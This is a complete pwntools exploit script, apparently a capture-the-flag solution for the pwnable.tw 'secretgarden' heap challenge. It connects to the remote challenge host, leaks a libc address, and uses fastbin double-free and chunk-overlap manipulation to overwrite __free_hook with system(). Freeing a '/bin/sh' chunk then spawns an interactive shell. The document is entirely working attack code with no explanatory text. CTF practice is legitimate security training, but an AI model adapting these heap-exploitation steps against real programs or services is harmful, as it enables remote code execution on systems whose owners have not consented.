from pwn import *
elf = ELF("./secretgarden")
libc = ELF("./libc")
ld = ELF("./ld-2.23.so")
context.binary=elf
#target=process([elf.path],env={"LD_PRELOAD":libc.path})
target=remote('chall.pwnable.tw',10203)

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

def add(size,name="A",color="A"):
	sla("choice : ",str(1))
	sla("name :",str(size))
	sa("flower :",name)
	sla("flower :",color)
	
def leaks():
	sla("choice : ",str(2))
	target.recvuntil("[5] :")	
	leak=u64(target.recvline()[0:6].ljust(8,"\x00"))
	return leak
def delete(index):
	sla("choice : ",str(3))
	sla("garden:",str(index))

add(0x60)#0
add(0x60)#1	
add(0x28)#2
add(0x150)#3
add(0x60,"/bin/sh\x00")#4
delete(2)
delete(3)
add(0x150,"\x78")#5
libc_base=leaks()-0x3c3b78
libc_free_hook=libc_base+libc.symbols["__free_hook"]
libc_system=libc_base+libc.symbols["system"]
for i in range(15):
	add(0x20)
for i in range(4):
	delete(6+i)
add(0x70)#21
add(0x70)#22
add(0x40)#23
add(0x200)#24
delete(21)
delete(22)
delete(24)
for i in range(11):
	delete(10+i)
delete(22)
add(0x80)#29
payload=p64(0)+p64(0x71)+p64(libc_free_hook-0x28-0x50)*2
add(0x70,payload)
add(0x60)
delete(0)
delete(1)
delete(0)
add(0x60,p64(libc_free_hook-0x1b-0x50))
add(0x60)
add(0x60)
add(0x68,"\x00"*0x5b+p64(libc_system))
delete(4)
		
target.interactive()
